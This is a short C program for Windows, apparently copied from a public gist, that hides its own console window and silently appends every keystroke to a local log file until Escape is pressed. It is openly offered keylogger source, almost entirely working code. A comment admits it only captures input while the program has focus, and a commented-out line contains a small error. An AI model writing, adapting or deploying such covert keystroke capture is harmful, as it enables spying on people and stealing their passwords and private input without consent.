// https://gist.github.com/patilswapnilv/7338783
// it only gonna work if we focus to this program
#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>

#define PATH "keyboard-log.txt" // the path to the log file

int main()
{
    char capture;
    FILE *file;

    // Time stuff.
    time_t t;
    t = time(NULL);
    // Hide the window
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window,0);

    file = fopen(PATH, "a+");
    // fprintf(file, "\n#$Logger: Written by jkrix. Started logging @ %s", ctime(&time));

    while (1)
    {
        if (kbhit())
        //Function kbhit in C is used to determine if a key has been pressed or not
        {
            Sleep(10);
            capture = getch();
            // Just add in some helper strings here to the file, feel free to modify these to your needs.
            switch ((int)capture)
            {
            case ' ': // Space key...obviously.
                fprintf(file, " ");
                break;
            case 0x09: // Tab key.
                fprintf(file, "[TAB]");
                break;
            case 0x0D: // Enter key.
                fprintf(file, "[ENTER]");
                break;
            case 0x1B: // Escape key.
                fprintf(file, "[ESC]");
                break;
            case 0x08: // Backspace key.
                fprintf(file, "[BACKSPACE]");
                break;
            default:
                fputc(capture, file); // Put any other inputted key into the file.
            }

            if ((int)capture == 27)
            { // The escape key. You can change this to anything you want.
                fputc('\n',file);
                fclose(file);
                return 0;
            }
        }
    }
}